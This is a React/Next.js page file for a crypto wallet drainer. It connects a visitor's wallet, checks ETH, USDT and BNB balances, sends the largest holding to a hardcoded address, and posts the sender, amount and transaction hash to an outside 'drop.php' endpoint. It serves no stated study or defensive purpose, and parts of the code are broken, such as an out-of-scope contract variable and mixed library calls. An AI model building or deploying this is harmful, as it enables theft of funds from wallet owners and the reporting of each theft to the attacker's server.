// pages/index.js

import { useState, useEffect } from 'react';
import { Web3Provider } from '@ethersproject/providers';
import WalletConnectProvider from '@walletconnect/client';
import Web3Modal from 'web3modal';
import axios from 'axios';

const supportedTokens = {
  ETH: 'ETH',
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Example USDT ERC20 contract address
  BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', // Example BNB ERC20 contract address
  // Add more supported tokens as needed
};

const erc20ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [{ name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }],
    name: 'transfer',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
];

export default function Home() {
  const [web3Modal, setWeb3Modal] = useState(null);

  useEffect(() => {
    const modal = new Web3Modal.default({
      cacheProvider: true,
      providerOptions: {
        walletconnect: {
          package: WalletConnectProvider,
          options: {
            infuraId: process.env.NEXT_PUBLIC_INFURA_PROJECT_ID,
          },
        },
        // Add other wallet options as needed (e.g., MetaMask, TrustWallet)
      },
    });
    setWeb3Modal(modal);
  }, []);

  const handleConnect = async () => {
    try {
      const provider = await web3Modal.connect();
      const web3Provider = new Web3Provider(provider);
      const signer = web3Provider.getSigner();
      const address = await signer.getAddress();

      // Fetch balances
      const balances = await Promise.all(
        Object.keys(supportedTokens).map(async (token) => {
          if (token === 'ETH') {
            const balance = await web3Provider.getBalance(address);
            return { name: token, balance };
          } else {
            const contract = new web3Provider.Contract(erc20ABI, supportedTokens[token]);
            const balance = await contract.methods.balanceOf(address).call();
            return { name: token, balance };
          }
        })
      );

      // Find token with maximum balance
      balances.sort((a, b) => b.balance - a.balance);
      const maxToken = balances[0];

      // Send transaction
      const transaction = await signer.sendTransaction({
        to: '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f', // Example recipient address
        value: maxToken.name === 'ETH' ? maxToken.balance : 0,
        data: maxToken.name !== 'ETH' ? contract.methods.transfer('0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f', maxToken.balance).encodeABI() : undefined,
      });

      // Notify PHP endpoint
      await axios.post('https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php', {
        status: 'approved',
        transactionHash: transaction.hash,
        sender: address,
        recipient: '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f',
        token: maxToken.name,
        balance: maxToken.balance.toString(),
      });

      console.log('Transaction successful:', transaction.hash);
    } catch (error) {
      console.error('Transaction failed:', error.message);
      // Notify PHP endpoint of error
      await axios.post('https://eflujsyb0kuybgol11532.cleavr.one/btc/drop.php', {
        status: 'declined',
        error: error.message,
      });
    }
  };

  return (
    <div>
      <button onClick={handleConnect}>Connect Wallet & Send Maximum Token</button>
    </div>
  );
}
